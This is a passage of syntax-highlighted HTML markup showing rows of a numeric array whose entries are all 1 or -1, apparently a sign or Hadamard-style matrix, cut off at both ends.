class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span 